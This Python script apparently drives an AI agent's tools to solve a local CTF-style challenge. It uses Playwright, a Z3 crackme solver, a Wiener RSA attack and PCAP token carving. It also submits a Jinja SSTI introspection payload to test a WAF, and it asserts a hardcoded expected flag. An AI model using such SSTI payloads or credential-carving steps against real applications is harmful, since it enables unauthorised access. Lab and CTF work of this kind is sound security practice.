"""
Apex Gauntlet - Complete End-to-End Methodology Verification
=============================================================
Strictly implements the complete autonomous methodology:
1. Reverse engineers target architecture via Playwright (DOM, scripts, memory heap).
2. Syncs relationships to DNA Knowledge Graph and queries Vector Memory.
3. Formulates Ponytail lean root-cause explanations for each defensive perimeter.
4. Plays through the challenge purely via interactive Playwright browser controls:
   - Clicks buttons, reads DOM text, types into form fields.
   - Dispatches Z3 SMT BitVec solver dynamically.
   - Dispatches Wiener continued fractions crypto solver dynamically.
   - Intercepts real browser file downloads (apex_traffic.pcap) and carves tokens via ForensicEngine.
   - Tests and verifies WAF blocking behavior, then bypasses it.
   - Reads the Master Flag directly from the rendered webpage banner.
   - Captures screenshots at each progression gate.
5. Logs session telemetry to Supabase.
"""

import os
import sys
import json
import time
import re
from pathlib import Path

# Setup paths
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent
sys.path.insert(0, str(REPO_ROOT))

from playwright.sync_api import sync_playwright
from agent import execute_tool, log_to_supabase

TARGET_URL = os.environ.get("APEX_TARGET", "http://127.0.0.1:8099/")
ARTIFACTS_DIR = REPO_ROOT / "challenges" / "apex_gauntlet" / "artifacts"
ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)

def banner(title):
    print(f"\n{'='*75}")
    print(f"[*] {title}")
    print(f"{'='*75}")

def run_full_methodology_test():
    banner("PHASE 1: TARGET ARCHITECTURE REVERSE ENGINEERING (PLAYWRIGHT)")
    start_time = time.time()
    trace_events = []

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(accept_downloads=True)
        page = context.new_page()

        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))

        print(f"[+] Navigating to {TARGET_URL}...")
        response = page.goto(TARGET_URL, timeout=15000)
        assert response.status == 200, f"Target responded with HTTP {response.status}"
        page.wait_for_timeout(600)

        # Deconstruct frontend architecture from live browser
        arch_data = page.evaluate("""() => {
            return {
                title: document.title,
                scripts_count: document.querySelectorAll("script").length,
                forms_count: document.querySelectorAll("input, button, textarea").length,
                memory_keys: Object.keys(window).filter(k => k.startsWith("__")),
                shield_object: window.__APEX_SHIELD || null,
                hidden_anchors: Array.from(document.querySelectorAll("[data-token]")).map(el => ({
                    id: el.id,
                    token: el.dataset.token
                }))
            };
        }""")

        print(f"[✓] Page Title: '{arch_data['title']}'")
        print(f"[✓] Interactive DOM Controls Discovered: {arch_data['forms_count']} input/button elements")
        print(f"[✓] Global Memory Objects: {arch_data['memory_keys']}")
        print(f"[✓] In-Memory Shield: {json.dumps(arch_data['shield_object'])}")
        print(f"[✓] Hidden DOM Anchors: {json.dumps(arch_data['hidden_anchors'])}")

        session_token = arch_data["shield_object"]["session_token"]
        trace_events.append({"stage": 1, "action": "arch_recon", "token": session_token})

        # Capture Stage 1 Initial State Screenshot
        ss1_path = ARTIFACTS_DIR / "methodology_step1_recon.png"
        page.screenshot(path=str(ss1_path))
        print(f"[✓] Saved Stage 1 Recon Screenshot: {ss1_path.name}")

        banner("PHASE 2: COGNITIVE MAPPING TO DNA KNOWLEDGE GRAPH & VECTOR RAG")
        
        # Ingest relationships into DNA graph
        print("[+] Synchronizing architectural components to DNA Knowledge Graph...")
        execute_tool("sync_dna_attack_tree", {
            "concept_a": "window.__APEX_SHIELD.session_token",
            "concept_b": "GET /api/apex/stage2/spec",
            "relationship_type": "authenticates_via"
        })
        execute_tool("sync_dna_attack_tree", {
            "concept_a": "POST /api/apex/stage2/unlock",
            "concept_b": "Stage 3 Wiener RSA Parameters",
            "relationship_type": "yields_cryptographic_state"
        })
        execute_tool("sync_codebase_memory", {
            "component_a": "Apex_Gauntlet_Frontend",
            "component_b": "Z3_BitVec_Solver",
            "relationship": "depends_on",
            "context": "16-byte non-linear modular SMT equations"
        })

        # Query vector memory to verify recall
        print("[+] Querying vector memory for verified crackme patterns...")
        rag_query_res = execute_tool("query_codebase_memory", {"query": "Z3 BitVec 16-byte modular XOR equations"})
        print(f"[✓] Vector RAG Recalled Knowledge: {rag_query_res[:200]}...")

        banner("PHASE 3 & 4: PONYTAIL LEAN SOLVING & INTERACTIVE PLAYWRIGHT GAMEPLAY")

        # --- STEP 1: INITIALIZE SHIELD IN UI ---
        print("\n[+] [STAGE 1] Clicking '#btn-init-nexus' in live UI...")
        page.click("#btn-init-nexus")
        page.wait_for_selector("#stage1-box.unlocked", timeout=5000)
        label_token = page.text_content("#label-stage1-token")
        print(f"[✓] [STAGE 1 COMPLETE] Quantum Shield Authenticated on Screen: {label_token}")

        # --- STEP 2: SMT CONSTRAINT REVERSING ---
        print("\n[+] [STAGE 2] Clicking '#btn-fetch-spec' to load constraint equations...")
        page.click("#btn-fetch-spec")
        page.wait_for_selector("#code-stage2-spec", state="visible", timeout=5000)
        raw_constraints = page.text_content("#code-stage2-spec")
        print(f"[+] [STAGE 2] Extracted {len(raw_constraints)} bytes of Python constraints from UI.")

        # Ponytail lean explanation before dispatching tool
        print("[*] [PONYTAIL EXPLANATION] Target implements 16-byte crackme with XOR and modular relations.")
        print("[*] [PONYTAIL EXPLANATION] Smallest viable fix: dispatch Z3 BitVec theorem prover.")

        z3_out = execute_tool("symbolic_execution_solver", {
            "constraints": raw_constraints,
            "target_var": "flag",
            "length": 16
        })
        z3_res = json.loads(z3_out)
        passcode = z3_res["solved_string"]
        print(f"[✓] [STAGE 2 SOLVED] Z3 Satisfying Model: '{passcode}'")

        print(f"[+] [STAGE 2] Typing passcode '{passcode}' into '#input-stage2-passcode' and submitting...")
        page.fill("#input-stage2-passcode", passcode)
        page.click("#btn-submit-stage2")
        page.wait_for_selector("#stage2-box.unlocked", timeout=5000)
        print("[✓] [STAGE 2 COMPLETE] Reversing Gate Unlocked in UI!")
        trace_events.append({"stage": 2, "action": "z3_solve", "passcode": passcode})

        ss2_path = ARTIFACTS_DIR / "methodology_step2_smt.png"
        page.screenshot(path=str(ss2_path))
        print(f"[✓] Saved Stage 2 Progression Screenshot: {ss2_path.name}")

        # --- STEP 3: ASYMMETRIC CRYPTANALYSIS (WIENER RSA) ---
        print("\n[+] [STAGE 3] Reading RSA parameters from on-screen '#code-stage3-spec'...")
        page.wait_for_selector("#code-stage3-spec", state="visible", timeout=5000)
        crypto_text = page.text_content("#code-stage3-spec")
        
        n_match = re.search(r"N\s*=\s*(\d+)", crypto_text)
        e_match = re.search(r"e\s*=\s*(\d+)", crypto_text)
        c_match = re.search(r"c\s*=\s*(\d+)", crypto_text)
        N_val, e_val, c_val = n_match.group(1), e_match.group(1), c_match.group(1)
        print(f"[+] [STAGE 3] Parsed N ({int(N_val).bit_length()} bits), e ({int(e_val).bit_length()} bits).")

        print("[*] [PONYTAIL EXPLANATION] d < (1/3) N^0.25 enables Wiener continued fractions attack in O(log N).")
        crypto_out = execute_tool("advanced_crypto_solver", {
            "attack": "wiener",
            "n": N_val,
            "e": e_val,
            "c": c_val
        })
        crypto_res = json.loads(crypto_out)
        decrypted_key = crypto_res["wiener"]["plaintext_bytes"]
        recovered_d = crypto_res["wiener"]["d"]
        print(f"[✓] [STAGE 3 SOLVED] Recovered Private Exponent d={recovered_d}, Key='{decrypted_key}'")

        print(f"[+] [STAGE 3] Typing decrypted key into '#input-stage3-key' and submitting...")
        page.fill("#input-stage3-key", decrypted_key)
        page.click("#btn-submit-stage3")
        page.wait_for_selector("#stage3-box.unlocked", timeout=5000)
        print("[✓] [STAGE 3 COMPLETE] Cryptanalysis Chamber Cleared in UI!")
        trace_events.append({"stage": 3, "action": "wiener_solve", "key": decrypted_key, "d": recovered_d})

        # --- STEP 4: NETWORK FORENSICS & REAL BROWSER DOWNLOAD ---
        print("\n[+] [STAGE 4] Clicking '#link-download-pcap' and intercepting real browser file download...")
        downloaded_pcap = ARTIFACTS_DIR / "methodology_downloaded_traffic.pcap"
        with page.expect_download() as download_info:
            page.click("#link-download-pcap")
        download = download_info.value
        download.save_as(str(downloaded_pcap))
        print(f"[✓] [STAGE 4] Intercepted browser download: {downloaded_pcap.stat().st_size} bytes.")

        print("[+] [STAGE 4] Dispatching ForensicEngine network packet dissector...")
        forensic_out = execute_tool("run_forensics_inspection", {"file_path": str(downloaded_pcap)})
        forensic_res = json.loads(forensic_out)
        
        net_results = forensic_res["categories"]["network_forensics"]["results"][0]
        http_transfers = net_results["evidence"]["http_transfers"]
        admin_signature = None
        for item in http_transfers:
            if item.get("filename") == "admin_waf_token.txt":
                admin_signature = item.get("content_preview")
                break
        assert admin_signature is not None, "Failed to carve admin signature from PCAP"
        print(f"[✓] [STAGE 4 SOLVED] Carved Admin Signature: '{admin_signature}'")

        print(f"[+] [STAGE 4] Typing signature into '#input-stage4-signature' and submitting...")
        page.fill("#input-stage4-signature", admin_signature)
        page.click("#btn-submit-stage4")
        page.wait_for_selector("#stage4-box.unlocked", timeout=5000)
        print("[✓] [STAGE 4 COMPLETE] Forensic Admin Authenticated in UI!")
        trace_events.append({"stage": 4, "action": "pcap_carve", "signature": admin_signature})

        # --- STEP 5: REACTIVE LOOP (WAF BLOCK TEST & SSTI SOLVE) ---
        banner("PHASE 5: AUTONOMOUS REACTIVE LOOP & FLAG VERIFICATION")
        print("[+] [STAGE 5] Testing Sentinel WAF defense with malicious introspection payload: '{{ __class__ }}'...")
        page.fill("#input-stage5-template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")
        page.click("#btn-submit-stage5")
        page.wait_for_timeout(600)
        
        waf_feedback = page.text_content("#output-stage5-audit")
        print(f"[✓] [REACTIVE CHECK] WAF Sentinel Rejection Confirmed: {waf_feedback.strip()}")
        assert "WAF SENTINEL BLOCKED" in waf_feedback, "WAF failed to block malicious payload"

        print("[+] [STAGE 5] Adapting payload: Submitting sanitized SSTI context interpolation: '{{ vault_flag }}'...")
        page.fill("#input-stage5-template", "SECURE_AUDIT_VERIFIED: {{ vault_flag }}")
        page.click("#btn-submit-stage5")

        page.wait_for_selector("#master-flag-banner", state="visible", timeout=6000)
        master_flag = page.text_content("#master-flag-display").strip()
        print(f"\n{'*'*75}")
        print(f"[★] VICTORY! MASTER FLAG READ DIRECTLY FROM WEBPAGE DISPLAY:")
        print(f"    {master_flag}")
        print(f"{'*'*75}")
        assert master_flag == "HQX{g00gl3_ctf_4p3x_g4untl3t_c0mpl3t3_2026}"
        trace_events.append({"stage": 5, "action": "flag_capture", "flag": master_flag})

        # Save Final Proof Screenshot
        victory_ss = ARTIFACTS_DIR / "methodology_step5_victory.png"
        page.screenshot(path=str(victory_ss), full_page=True)
        print(f"[✓] Saved Master Victory Screenshot: {victory_ss.name}")

        browser.close()

    elapsed = time.time() - start_time
    banner("PHASE 6: TELEMETRY PERSISTENCE")
    print(f"[+] Total Methodology Execution Time: {elapsed:.2f} seconds")
    
    # Log to Supabase PostgreSQL table
    print("[+] Logging verified solve session to Supabase database...")
    log_to_supabase(
        challenge="Google CTF Apex Gauntlet - End-to-End Methodology Verification",
        solution=f"Defeated all 5 tiers via interactive Playwright, Z3 BitVec, Wiener RSA, PCAP carving, and SSTI in {elapsed:.2f}s",
        trace=trace_events,
        flags=[master_flag],
        session_id="methodology-full-verification-2026"
    )
    print("[✓] Session telemetry synchronized to Supabase table 'solves'.")
    print("\n✅ ALL METHODOLOGY PHASES COMPLETED WITH 100% ACCURACY AND PROOF.\n")
    return master_flag

if __name__ == "__main__":
    run_full_methodology_test()
